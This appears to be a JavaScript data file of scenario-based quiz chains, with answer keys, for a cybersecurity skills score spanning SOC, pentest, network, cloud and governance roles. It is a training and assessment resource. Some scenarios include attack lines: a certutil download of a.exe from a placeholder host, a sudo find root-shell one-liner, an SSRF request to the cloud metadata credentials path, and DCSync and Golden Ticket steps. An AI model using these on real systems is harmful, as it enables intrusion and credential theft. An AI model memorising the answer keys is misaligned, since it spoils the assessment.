// Scenario-depth chains for the SecMox Score. One realistic scenario, then a
// ladder of auto-scored steps that escalate: orient, act, investigate, scope.
// The score rewards how far you climb correctly, so a pasted or guessed answer
// breaks the streak at the first real follow-up.
//
// Scenarios use {{kind}} placeholders (ip, intip, host, srv, svc, user, domain,
// bucket, port, time). Each attempt fills them with fresh values (see src/vars.js)
// so a scenario never looks identical twice and rote memorisation of specifics
// is useless. Explanations stay concept-based (no placeholders), and the correct
// answer never depends on the generated values.
//
// Each step: { label, prompt, type: 'mcq', options: [..], answer: <index>, explain }
// chain difficulty doubles as its weight: 1 easy, 2 medium, 3 hard.

export const SCORE_CHAINS = [
  // ---------------- SOC ----------------
  {
    slug: 'ps-finance-workstation',
    role: 'soc',
    title: 'PowerShell on a finance workstation',
    difficulty: 3,
    scenario:
      '{{time}}. An EDR alert fires on {{host}}, a finance workstation. The process tree:\n\n' +
      'winword.exe\n' +
      ' └─ powershell.exe -enc JABzPQBOZXctT2Jq...(base64)\n' +
      '      └─ cmd.exe /c certutil -urlcache -f http://{{ip}}/a.exe %TEMP%\\a.exe\n' +
      '           └─ a.exe\n\n' +
      'The user says they opened a supplier invoice about an hour ago.',
    steps: [
      {
        label: 'Orient',
        prompt: 'What is the most likely initial access vector?',
        type: 'mcq',
        options: [
          'A drive-by download from web browsing',
          'A malicious macro in the opened invoice',
          'An RDP brute force',
          'A dropped USB device',
        ],
        answer: 1,
        explain: 'Office spawning PowerShell right after the user opened an attachment points to a malicious macro.',
      },
      {
        label: 'First action',
        prompt: 'The host is still powered on and online. What is your immediate action?',
        type: 'mcq',
        options: [
          'Reimage the machine right away',
          'Isolate the host from the network but keep it powered on',
          'Shut the host down',
          'Ask the user to run a full antivirus scan',
        ],
        answer: 1,
        explain: 'Isolate to stop spread, but keep it running to preserve memory and live evidence.',
      },
      {
        label: 'Investigate',
        prompt: 'certutil pulled a.exe from {{ip}}. Which single source best confirms a.exe ran and made outbound connections?',
        type: 'mcq',
        options: [
          'The email gateway logs',
          "The host's EDR process and network telemetry",
          'The domain controller security log',
          "The firewall's allow-rule list",
        ],
        answer: 1,
        explain: 'EDR on the host shows process execution and the outbound connections the dropped file made.',
      },
      {
        label: 'Scope',
        prompt: 'You confirm a.exe beacons to {{ip}} every ~60s. Best next step to find other compromised hosts?',
        type: 'mcq',
        options: [
          "Block the user's account",
          'Pivot on {{ip}} across endpoint and proxy logs to find other hosts contacting it',
          'Reset all finance passwords',
          'Run antivirus on the one host again',
        ],
        answer: 1,
        explain: 'The C2 address is the pivot: any other host talking to it is likely also compromised.',
      },
    ],
  },
  {
    slug: 'brute-then-new-admin',
    role: 'soc',
    title: 'Brute force, then a new Domain Admin',
    difficulty: 2,
    scenario:
      '{{time}}. A detection fires. The service account {{svc}} had 240 failed logons from {{intip}} in 4 minutes, then one success. Within the next 2 minutes that account created a new user "{{user}}-adm" and added it to Domain Admins.',
    steps: [
      {
        label: 'Orient',
        prompt: 'What does this pattern indicate?',
        type: 'mcq',
        options: [
          'A misconfigured backup job',
          'A successful password brute force followed by privilege escalation',
          'A routine administrative task',
          'A DNS resolution problem',
        ],
        answer: 1,
        explain: 'Mass failures then a success, immediately followed by creating a Domain Admin, is brute force into escalation.',
      },
      {
        label: 'First action',
        prompt: 'What is the first containment step?',
        type: 'mcq',
        options: [
          'Disable {{svc}} and the new {{user}}-adm account',
          'Reboot the domain controller',
          'Delete the security logs',
          'Email the account owner',
        ],
        answer: 0,
        explain: 'Cut off the compromised and attacker-created accounts first.',
      },
      {
        label: 'Investigate',
        prompt: 'To understand what the attacker did after gaining Domain Admin, which is most valuable?',
        type: 'mcq',
        options: [
          'The DC logon (4624/4672) and account-change (4720/4728) events',
          'The printer logs',
          'The DHCP leases',
          'The web proxy alone',
        ],
        answer: 0,
        explain: 'Those events show the privileged logons and the account changes the attacker made.',
      },
      {
        label: 'Scope',
        prompt: 'The attacker had Domain Admin. Which is the LEAST safe to assume is cleaned by just disabling the two accounts?',
        type: 'mcq',
        options: [
          'Deeper persistence: new scheduled tasks/GPOs and possible krbtgt (Golden Ticket) exposure',
          'The two disabled accounts',
          'The source IP {{intip}}',
          'The failed-logon noise',
        ],
        answer: 0,
        explain: 'With Domain Admin the attacker may have planted persistence or stolen krbtgt; disabling two accounts does not clear that.',
      },
    ],
  },

  // ---------------- Pentest ----------------
  {
    slug: 'linux-web-foothold',
    role: 'pentest',
    title: 'Foothold on a Linux web server',
    difficulty: 2,
    scenario:
      'You have a www-data shell on {{srv}} after a file-upload bug. `sudo -l` returns:\n\n' +
      '    (ALL) NOPASSWD: /usr/bin/find\n\n' +
      'You also notice /opt/scripts/backup.sh is world-writable and run by root via cron every minute.',
    steps: [
      {
        label: 'Orient',
        prompt: 'Which is the most direct path to root right now?',
        type: 'mcq',
        options: [
          'The passwordless sudo on /usr/bin/find',
          'Recompiling the kernel',
          "Brute forcing root's password",
          'Waiting for a reboot',
        ],
        answer: 0,
        explain: 'sudo find is instant via its -exec; the writable cron also works but takes up to a minute.',
      },
      {
        label: 'Exploit',
        prompt: 'How do you abuse `sudo find` to get a root shell?',
        type: 'mcq',
        options: [
          'sudo find . -exec /bin/sh \\; -quit',
          'sudo find / -name root',
          'sudo find --version',
          'sudo find / -type f',
        ],
        answer: 0,
        explain: "find's -exec runs a command; with sudo that command (/bin/sh) runs as root.",
      },
      {
        label: 'Act in scope',
        prompt: 'You are root. For the engagement, what is the right first action?',
        type: 'mcq',
        options: [
          'Capture proof (id, hostname, the target/flag) and note the time, per scope',
          'Delete the system logs',
          'Install a hidden backdoor for later',
          'Email the client the password',
        ],
        answer: 0,
        explain: 'A pentest documents access with proof; it does not destroy logs or plant unauthorized backdoors.',
      },
      {
        label: 'Report',
        prompt: 'Which finding is the root cause worth the highest severity?',
        type: 'mcq',
        options: [
          'The passwordless sudo on find and the world-writable root cron (direct privilege escalation)',
          'The Apache version banner',
          'An outdated jQuery include',
          'A missing security header',
        ],
        answer: 0,
        explain: 'Both give a direct path to root; that is critical, far above an info-level banner.',
      },
    ],
  },
  {
    slug: 'ad-user-to-da',
    role: 'pentest',
    title: 'Active Directory: user to Domain Admin',
    difficulty: 3,
    scenario:
      'On an internal test you hold a standard domain user. BloodHound shows:\n\n' +
      'YOU → member of → IT-Support → GenericWrite over → {{svc}} → member of → Server Admins → local admin on → {{srv}}',
    steps: [
      {
        label: 'Orient',
        prompt: 'What does GenericWrite over {{svc}} let you do?',
        type: 'mcq',
        options: [
          'Read its current password directly',
          'Take over the account (e.g. set a fake SPN and Kerberoast, or a targeted reset)',
          'Delete the whole domain',
          'Nothing useful',
        ],
        answer: 1,
        explain: 'GenericWrite enables a targeted takeover of the account, for example via a fake SPN then Kerberoast.',
      },
      {
        label: 'Exploit',
        prompt: 'Having taken over {{svc}} (local admin on {{srv}}), what is the cleanest path to Domain Admin?',
        type: 'mcq',
        options: [
          'Dump credentials/secrets from the DC with local admin (e.g. DCSync or LSASS)',
          'Phish the real administrator',
          'Brute force the Domain Admin password',
          'Wait for an admin to log in',
        ],
        answer: 0,
        explain: 'Local admin on a domain controller lets you extract domain secrets directly.',
      },
      {
        label: 'Validate',
        prompt: 'You obtain the krbtgt hash. What does that enable?',
        type: 'mcq',
        options: [
          'A Golden Ticket: forge Kerberos tickets as any user, including Domain Admin',
          'Only the ability to read email',
          'Nothing of value',
          'A denial of service',
        ],
        answer: 0,
        explain: 'The krbtgt hash lets you forge TGTs for anyone (a Golden Ticket).',
      },
      {
        label: 'Report',
        prompt: 'What is the core misconfiguration to flag?',
        type: 'mcq',
        options: [
          'An excessive ACL path (GenericWrite) from a low-privilege group to a privileged service account',
          "The DC's uptime",
          'A weak TLS cipher on an unrelated site',
          'Verbose error pages',
        ],
        answer: 0,
        explain: 'The whole chain exists because a low-privilege group can write to a privileged account.',
      },
    ],
  },

  // ---------------- Network ----------------
  {
    slug: 'firewall-change-broke-app',
    role: 'network',
    title: 'A firewall change broke the app',
    difficulty: 2,
    scenario:
      'After a {{time}} firewall change, users cannot reach the internal app at {{intip}}:443.\n' +
      '- ping {{intip}} succeeds\n' +
      '- curl https://{{intip}} from a user subnet times out\n' +
      '- on the server, the service is listening on 0.0.0.0:443',
    steps: [
      {
        label: 'Orient',
        prompt: 'Ping works but TCP 443 times out. What does this most suggest?',
        type: 'mcq',
        options: [
          'DNS is down',
          'A firewall/ACL is blocking TCP 443 to the server',
          'The application crashed',
          'A bad TLS certificate',
        ],
        answer: 1,
        explain: 'ICMP succeeding while a TCP port times out points to a filtering rule, not the host or the app.',
      },
      {
        label: 'Narrow it down',
        prompt: 'Best next check to confirm?',
        type: 'mcq',
        options: [
          'Test the port from the user subnet (e.g. nc -vz {{intip}} 443)',
          'Reboot the application',
          'Clear the browser cache',
          'Renew the certificate',
        ],
        answer: 0,
        explain: 'A direct port test from the affected subnet confirms whether 443 is reachable.',
      },
      {
        label: 'Fix',
        prompt: 'The change removed the allow rule for 443 from the user VLAN. Correct fix?',
        type: 'mcq',
        options: [
          'Re-add a specific allow rule for TCP 443 from the user VLAN to {{intip}}',
          'Disable the firewall',
          'Allow all traffic everywhere',
          'Move the app to port 80',
        ],
        answer: 0,
        explain: 'Restore the least-privilege rule that was removed, nothing broader.',
      },
      {
        label: 'Prevent',
        prompt: 'What practice would have caught this before users did?',
        type: 'mcq',
        options: [
          'Change control with a tested rollback and a post-change connectivity check',
          'A faster internet link',
          'A bigger firewall appliance',
          'More RAM on the app server',
        ],
        answer: 0,
        explain: 'Post-change validation and a rollback plan catch connectivity breaks immediately.',
      },
    ],
  },
  {
    slug: 'dns-tunneling',
    role: 'network',
    title: 'Odd DNS traffic from one host',
    difficulty: 2,
    scenario:
      'On a span port you capture a repeating pattern from internal host {{intip}}:\n\n' +
      '{{intip}} → resolver  DNS A  d2hhdGV2ZXI.{{domain}}\n' +
      '{{intip}} → resolver  DNS A  bW9yZWRhdGE.{{domain}}\n' +
      '(long random-looking subdomains, every few seconds)',
    steps: [
      {
        label: 'Orient',
        prompt: 'What is this most likely?',
        type: 'mcq',
        options: ['Normal web browsing', 'DNS tunneling / data exfiltration via subdomains', 'A printer discovering itself', 'NTP time sync'],
        answer: 1,
        explain: 'Steady, long, high-entropy subdomains under one external domain is classic DNS tunneling.',
      },
      {
        label: 'Confirm',
        prompt: 'Which detail most supports that?',
        type: 'mcq',
        options: [
          'Long, high-entropy, base64-like subdomains under one external domain at steady intervals',
          'The queries use a public resolver',
          'The host is on an internal subnet',
          'DNS uses UDP',
        ],
        answer: 0,
        explain: 'The encoded, high-entropy labels carrying data are the tell, not the transport.',
      },
      {
        label: 'Contain',
        prompt: 'Immediate containment?',
        type: 'mcq',
        options: [
          'Isolate {{intip}} and sinkhole/block the external domain',
          'Reboot the DNS resolver',
          'Increase the DNS TTL',
          'Do nothing yet',
        ],
        answer: 0,
        explain: 'Cut the host off and stop resolution of the exfil domain.',
      },
      {
        label: 'Prevent',
        prompt: 'Which control best reduces this class of exfiltration?',
        type: 'mcq',
        options: [
          'Egress DNS control: force internal resolvers, block direct outbound 53, and monitor for anomalous query patterns',
          'Buy more bandwidth',
          'Disable IPv6',
          'Require longer user passwords',
        ],
        answer: 0,
        explain: 'Controlling and monitoring egress DNS is the direct defence against tunneling.',
      },
    ],
  },

  // ---------------- Cloud ----------------
  {
    slug: 'public-s3-leaked-key',
    role: 'cloud',
    title: 'Public bucket with a leaked key',
    difficulty: 2,
    scenario:
      "A researcher reports your S3 bucket '{{bucket}}' is publicly listable. Inside is config.env containing an AWS access key (AKIA...) and secret. CloudTrail shows that key made GetObject calls from an unfamiliar IP yesterday.",
    steps: [
      {
        label: 'Orient',
        prompt: 'What is the first and most urgent action?',
        type: 'mcq',
        options: [
          'Delete the bucket',
          'Rotate/disable the exposed AWS key immediately, then lock the bucket',
          'Rename config.env',
          'Reply to the researcher first',
        ],
        answer: 1,
        explain: 'The live, already-used key is the active exposure; kill it first.',
      },
      {
        label: 'Contain',
        prompt: 'After disabling the key, how do you lock the data?',
        type: 'mcq',
        options: [
          'Enable Block Public Access and remove the public policy/ACL on the bucket',
          'Set the bucket to public-read-only',
          'Move it to another region',
          'Turn off CloudTrail',
        ],
        answer: 0,
        explain: 'Block Public Access plus removing the public policy closes the exposure.',
      },
      {
        label: 'Investigate',
        prompt: 'To learn what the attacker accessed with that key, which source is right?',
        type: 'mcq',
        options: [
          'CloudTrail events for that access key identity',
          'The bucket name',
          'The IAM user list only',
          'The billing console',
        ],
        answer: 0,
        explain: 'CloudTrail ties actions to the specific key identity.',
      },
      {
        label: 'Scope',
        prompt: 'The key belonged to a role with s3:* on all buckets. Beyond rotation, the key fix?',
        type: 'mcq',
        options: [
          'Scope the role to least privilege (specific bucket + actions) and check other buckets for exposure',
          'Add MFA to the researcher',
          'Delete the CloudTrail logs',
          'Raise the bucket size limit',
        ],
        answer: 0,
        explain: 'The over-broad role is the systemic issue; scope it and review blast radius.',
      },
    ],
  },
  {
    slug: 'ssrf-metadata',
    role: 'cloud',
    title: 'SSRF reaches the metadata endpoint',
    difficulty: 3,
    scenario:
      'An image-fetch feature downloads a URL the user submits. A WAF log shows a user submitted:\n\n' +
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role\n\n' +
      'and the response was 200 with JSON.',
    steps: [
      {
        label: 'Orient',
        prompt: 'What happened?',
        type: 'mcq',
        options: [
          'A harmless health check',
          'SSRF reached the instance metadata endpoint and returned IAM credentials',
          'A normal DNS lookup',
          'A CDN cache hit',
        ],
        answer: 1,
        explain: 'The fetch feature was tricked into requesting the metadata endpoint, leaking role credentials.',
      },
      {
        label: 'Impact',
        prompt: 'What can the attacker now do?',
        type: 'mcq',
        options: [
          "Use the leaked temporary credentials with the app-role's permissions",
          'Only view an image',
          'Nothing, they expire instantly',
          'Restart the server',
        ],
        answer: 0,
        explain: 'The credentials act as the role until they expire, giving the attacker its permissions.',
      },
      {
        label: 'Contain',
        prompt: 'Best immediate mitigation for the leaked creds and the SSRF?',
        type: 'mcq',
        options: [
          'Rotate/revoke the role sessions, block the metadata IP, and validate/allowlist fetch URLs',
          'Increase the instance size',
          'Disable logging',
          'Change the region',
        ],
        answer: 0,
        explain: 'Kill the stolen session and stop the fetch feature reaching internal addresses.',
      },
      {
        label: 'Prevent',
        prompt: 'Which single control best prevents this class going forward?',
        type: 'mcq',
        options: [
          'Enforce IMDSv2 (token-bound) and strict egress/URL allowlisting on the fetch feature',
          'A stronger admin password',
          'Public read on the bucket',
          'Longer log retention only',
        ],
        answer: 0,
        explain: 'IMDSv2 plus URL allowlisting removes the easy SSRF-to-credentials path.',
      },
    ],
  },

  // ---------------- GRC ----------------
  {
    slug: 'vendor-wants-data',
    role: 'grc',
    title: 'A vendor wants customer data',
    difficulty: 2,
    scenario:
      "A new marketing vendor wants API access to your customer database (names, emails, purchase history) to 'personalize campaigns'. The business wants it live next week.",
    steps: [
      {
        label: 'Orient',
        prompt: 'What should happen first?',
        type: 'mcq',
        options: [
          'Grant access to hit the deadline',
          'A vendor risk and data-protection assessment before any access',
          'Refuse outright',
          'Give read access to everything',
        ],
        answer: 1,
        explain: 'Assess the risk and the data-protection implications before granting access.',
      },
      {
        label: 'Scope',
        prompt: 'What principle governs which data to share?',
        type: 'mcq',
        options: [
          'Share the whole database for flexibility',
          'Data minimization: only the fields the use case needs, pseudonymized where possible',
          'Share nothing, ever',
          'Let the vendor decide',
        ],
        answer: 1,
        explain: 'Share the minimum necessary, not the whole dataset.',
      },
      {
        label: 'Control',
        prompt: 'Which control is essential before go-live?',
        type: 'mcq',
        options: [
          'A Data Processing Agreement plus scoped, auditable, time-bound access',
          'A verbal agreement',
          'Unlimited API keys',
          "Trust in the vendor's reputation",
        ],
        answer: 0,
        explain: 'A DPA and least-privilege, auditable access put the arrangement on a defensible footing.',
      },
      {
        label: 'Monitor',
        prompt: 'After go-live, what sustains the control?',
        type: 'mcq',
        options: [
          "Periodic access review, monitoring of the vendor's API use, and re-assessment on any scope change",
          'Nothing further is needed',
          'Deleting the logs monthly',
          'Annual price renegotiation',
        ],
        answer: 0,
        explain: 'Access and usage must be reviewed and monitored over time, not just at onboarding.',
      },
    ],
  },
  {
    slug: 'client-ransomware-board',
    role: 'grc',
    title: 'Client ransomware, and the board asks questions',
    difficulty: 3,
    scenario:
      'A client you advise on security governance is hit by ransomware. Systems are down. The board asks you: what now, and what do we tell regulators and customers?',
    steps: [
      {
        label: 'Orient',
        prompt: 'What should drive the response?',
        type: 'mcq',
        options: [
          'Improvise as you go',
          'The incident response plan, and for disclosure the breach-notification obligations',
          'Pay the ransom immediately',
          'Blame the IT team',
        ],
        answer: 1,
        explain: 'A rehearsed IR plan drives the response; legal obligations drive disclosure.',
      },
      {
        label: 'Prioritise',
        prompt: 'What is the right order of early intent?',
        type: 'mcq',
        options: [
          'Contain and preserve evidence, assess scope, then restore from clean backups',
          'Pay first, ask questions later',
          'Wipe everything immediately',
          'Issue a public statement before anything else',
        ],
        answer: 0,
        explain: 'Contain, understand scope, and recover from known-good backups.',
      },
      {
        label: 'Disclosure',
        prompt: 'What determines whether and when you must notify regulators and customers?',
        type: 'mcq',
        options: [
          "The CEO's preference",
          'Whether personal/regulated data was affected and the applicable legal notification timelines',
          "Marketing's calendar",
          "The ransom note's deadline",
        ],
        answer: 1,
        explain: 'Notification duties turn on the data affected and the law, not internal preference.',
      },
      {
        label: 'Afterwards',
        prompt: 'The strongest governance lesson to institutionalise?',
        type: 'mcq',
        options: [
          'Buy more cyber insurance only',
          'Tested backups, least privilege and segmentation, and a rehearsed IR and comms plan',
          'Hire more staff only',
          'Avoid discussing it',
        ],
        answer: 1,
        explain: 'Resilience comes from tested recovery, containment by design, and practised response.',
      },
    ],
  },

  // ---- extra scenarios (varied lengths, so a run is not always 8 questions) ----
  {
    slug: 'alert-storm-triage',
    role: 'soc',
    title: 'Alert storm: what first',
    difficulty: 2,
    scenario:
      '{{time}}, right after a patch window, the SIEM throws 40 alerts at once: dozens of low-severity policy alerts, a few AV quarantines, some failed logons, and one EDR alert on {{host}} showing an unknown process reading lsass.exe memory.',
    steps: [
      {
        label: 'Triage',
        prompt: 'Which alert do you work first?',
        type: 'mcq',
        options: [
          'The EDR lsass memory-access alert on {{host}}',
          'The dozens of low-severity policy alerts',
          'The AV quarantines (already handled by AV)',
          'The failed logons from the patch reboot',
        ],
        answer: 0,
        explain: 'Access to lsass memory suggests credential dumping, the highest-impact signal in the pile.',
      },
      {
        label: 'Why',
        prompt: 'What makes that the priority?',
        type: 'mcq',
        options: [
          'It is the newest alert',
          'Credential theft enables lateral movement and privilege escalation across the domain',
          'It has the longest log line',
          'Policy alerts are never worth reviewing',
        ],
        answer: 1,
        explain: 'Stolen credentials turn one host into many; that potential impact sets the priority.',
      },
      {
        label: 'Act',
        prompt: 'First action on that host?',
        type: 'mcq',
        options: [
          'Isolate {{host}} from the network and preserve memory, then triage the rest',
          'Reboot it to clear the process',
          'Delete the EDR alert as a false positive',
          'Run a full AV scan and wait',
        ],
        answer: 0,
        explain: 'Isolate to stop spread while keeping volatile evidence intact.',
      },
    ],
  },
  {
    slug: 'spray-no-mfa',
    role: 'pentest',
    title: 'Password spray into a portal with no MFA',
    difficulty: 3,
    scenario:
      "External engagement. The client's webmail portal is internet-facing. You have about 200 likely usernames gathered from public sources. In scope: credential attacks against the portal.",
    steps: [
      {
        label: 'Orient',
        prompt: 'Safest credential attack that avoids locking accounts?',
        type: 'mcq',
        options: [
          'Password spraying: one common password across all users, slowly',
          'Brute forcing one account with thousands of passwords',
          'Trying every password on every account at once',
          'Phishing the whole company',
        ],
        answer: 0,
        explain: 'Spraying one password across many users stays under per-account lockout thresholds.',
      },
      {
        label: 'Exploit',
        prompt: 'A spray hits on one account and the portal logs in with no second factor. What does that tell you?',
        type: 'mcq',
        options: [
          'Nothing useful',
          'That account (and likely others) has a weak password and no MFA',
          'The portal is perfectly secure',
          'You must stop the test',
        ],
        answer: 1,
        explain: 'A single-factor login on a guessed password is both a weak-credential and a missing-MFA finding.',
      },
      {
        label: 'Expand',
        prompt: 'With that mailbox, what is a realistic next step in scope?',
        type: 'mcq',
        options: [
          'Check for internal resources reachable with those credentials (e.g. SSO, VPN)',
          'Email all staff from the account',
          'Delete the mailbox',
          'Change the password to lock the user out',
        ],
        answer: 0,
        explain: 'Reused credentials often unlock SSO or VPN; test that reach rather than disrupting the user.',
      },
      {
        label: 'Act in scope',
        prompt: 'How do you handle the access during the engagement?',
        type: 'mcq',
        options: [
          'Document access with proof and timestamps; do not read private mail beyond what scope allows',
          'Exfiltrate the mailbox for your report',
          'Keep the access secret from the client',
          'Pivot to out-of-scope systems to go deeper',
        ],
        answer: 0,
        explain: 'A pentest proves access within scope; it does not harvest data or stray beyond the rules.',
      },
      {
        label: 'Report',
        prompt: 'What is the highest-severity root cause to flag?',
        type: 'mcq',
        options: [
          'No MFA on an internet-facing portal plus a weak password policy',
          'The portal uses a slightly old TLS version',
          'The login page lacks a favicon',
          'Usernames are guessable from public profiles',
        ],
        answer: 0,
        explain: 'Single-factor internet-facing auth with weak passwords is the systemic, high-impact gap.',
      },
    ],
  },
  {
    slug: 'rogue-dhcp',
    role: 'network',
    title: 'Rogue DHCP on the LAN',
    difficulty: 2,
    scenario:
      'Users on one VLAN suddenly get wrong gateway addresses and flaky connectivity. A capture shows DHCP OFFER packets coming from {{intip}}, which is not your DHCP server.',
    steps: [
      {
        label: 'Orient',
        prompt: 'What is happening?',
        type: 'mcq',
        options: [
          'A rogue DHCP server is handing out bad configuration',
          'The internet is down',
          'DNS poisoning',
          'A broadcast storm',
        ],
        answer: 0,
        explain: 'Unexpected OFFERs from an unknown host handing out wrong gateways is a rogue DHCP server.',
      },
      {
        label: 'Act',
        prompt: 'How do you stop it quickly?',
        type: 'mcq',
        options: [
          'Trace {{intip}} to its switch port by MAC and disable that port',
          'Reboot every user machine',
          'Change everyone to static IPs permanently',
          'Turn off the real DHCP server',
        ],
        answer: 0,
        explain: 'Find the offending port from the MAC and shut it; that removes the rogue server.',
      },
      {
        label: 'Prevent',
        prompt: 'Which control stops this class of attack?',
        type: 'mcq',
        options: [
          'DHCP snooping, trusting only the legitimate server ports',
          'A faster switch',
          'Longer DHCP leases',
          'Disabling IPv6',
        ],
        answer: 0,
        explain: 'DHCP snooping drops server replies from untrusted ports, blocking rogue servers.',
      },
    ],
  },
  {
    slug: 'iam-key-escalation',
    role: 'cloud',
    title: 'IAM key used to grant itself admin',
    difficulty: 3,
    scenario:
      'CloudTrail shows IAM user {{user}} (a long-lived access key, console MFA not enabled) called iam:CreateUser and attached AdministratorAccess to a new user from {{ip}} at {{time}}.',
    steps: [
      {
        label: 'Orient',
        prompt: 'What does this indicate?',
        type: 'mcq',
        options: [
          'Routine automation',
          'A compromised IAM credential escalating privilege by creating an admin user',
          'A billing event',
          'A harmless read',
        ],
        answer: 1,
        explain: 'A key creating a new AdministratorAccess user from an unfamiliar IP is privilege escalation.',
      },
      {
        label: 'Contain',
        prompt: 'First containment action?',
        type: 'mcq',
        options: [
          'Disable the key for {{user}} and the newly created admin user',
          'Delete CloudTrail',
          'Rotate the root account only',
          'Email the user and wait',
        ],
        answer: 0,
        explain: 'Cut the compromised key and the attacker-created admin before anything else.',
      },
      {
        label: 'Investigate',
        prompt: 'Where do you learn what was done with the access?',
        type: 'mcq',
        options: [
          'CloudTrail events for that access key and the new user identity',
          'The billing dashboard',
          'The EC2 console only',
          'The S3 bucket list',
        ],
        answer: 0,
        explain: 'CloudTrail ties every action to the specific identities involved.',
      },
      {
        label: 'Scope',
        prompt: 'What must you assume about blast radius?',
        type: 'mcq',
        options: [
          'Only the one key is affected',
          'The admin user could have touched anything; review resources, new keys, and other principals created',
          'Nothing changed',
          'Only billing is affected',
        ],
        answer: 1,
        explain: 'An admin identity has broad reach; scope every resource and credential it could have altered.',
      },
      {
        label: 'Prevent',
        prompt: 'Which controls best prevent a repeat?',
        type: 'mcq',
        options: [
          'Enforce MFA, remove long-lived keys for short-lived roles, and apply least privilege',
          'A longer key',
          'Public read on buckets',
          'Turn off CloudTrail to reduce noise',
        ],
        answer: 0,
        explain: 'MFA, short-lived credentials and least privilege remove the easy escalation path.',
      },
    ],
  },
  {
    slug: 'erasure-request',
    role: 'grc',
    title: 'A customer demands their data be deleted',
    difficulty: 2,
    scenario:
      'A customer emails asking you to erase all their personal data under privacy law. The data sits across the CRM, the email marketing tool, and in backups.',
    steps: [
      {
        label: 'Orient',
        prompt: 'What is the first thing to establish?',
        type: 'mcq',
        options: [
          'Ignore it unless they insist',
          'Verify the requester and confirm it is a valid erasure request with a legal response window',
          'Delete the CRM entirely',
          'Forward it to marketing to decide',
        ],
        answer: 1,
        explain: 'Confirm identity and that the request is valid; a legal clock starts once it is.',
      },
      {
        label: 'Scope',
        prompt: 'What must you map before acting?',
        type: 'mcq',
        options: [
          'Only the CRM record',
          'Every system and processor holding that person’s data, including third-party tools',
          'Just the email tool',
          'Nothing, delete at random',
        ],
        answer: 1,
        explain: 'Erasure covers all copies, including data held by processors, so you must find them all.',
      },
      {
        label: 'Act',
        prompt: 'How do you handle backups that still contain the data?',
        type: 'mcq',
        options: [
          'Restore every backup to delete the record, immediately',
          'Delete or anonymize in live systems now, and handle backups per a documented retention and deletion policy',
          'Ignore backups entirely',
          'Keep the data indefinitely just in case',
        ],
        answer: 1,
        explain: 'Act on live systems now and address backups through a defensible, documented policy.',
      },
    ],
  },
];
